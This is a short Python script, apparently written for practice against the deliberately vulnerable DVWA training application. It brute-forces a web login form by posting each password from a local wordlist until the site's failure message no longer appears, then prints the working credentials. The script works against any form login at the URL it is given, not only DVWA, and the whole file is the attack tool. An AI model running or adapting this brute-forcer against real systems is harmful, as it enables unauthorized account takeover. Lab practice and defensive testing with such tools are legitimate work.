# DVWA BruteForce Tool

# made by CyberMAD

import requests

dvwa = "\033[38;5;118m"
clear = "\033[0m"

def logo(): 
    print(f"""{dvwa}
 ____             _       ______     ____        ___    
| __ ) _ __ _   _| |_ ___|  _ \ \   / /\ \      / / \   
|  _ \| '__| | | | __/ _ \ | | \ \ / /  \ \ /\ / / _ \  
| |_) | |  | |_| | ||  __/ |_| |\ V /    \ V  V / ___ \ 
|____/|_|   \__,_|\__\___|____/  \_/      \_/\_/_/   \_\ 
                                           
          {clear}""")

def brutedvwa(user, pwd, url, error):
    data = {
        "username": user,
        "password": pwd,
        "Login": "Login"
    }

    response = requests.post(url, data=data)
    
    if error in str(response.content):
        return False
    else:
        print(f"[{dvwa}BruteDVWA{clear}] {user}{dvwa}:{clear}{pwd}") 
        return True

def attack(passwords, user, url, error): 
    for password in passwords:
        password = password.strip()
        print(f"[{dvwa}BruteDVWA{dvwa}] User {dvwa}:{clear} {user} Login {dvwa}:{clear} {password}")
        if brutedvwa(user, password, url, error):
            return

if __name__ == "__main__":
    logo()
    url = input(f"[{dvwa}+{clear}] Url : ")
    user = input(f"[{dvwa}+{clear}] Username : ")
    error = input(f"[{dvwa}*{clear}] Wrong Password Error Message : ")  

    with open("password.txt", "r") as file:
        passwords = file.readlines()
    
    attack(passwords, user, url, error)





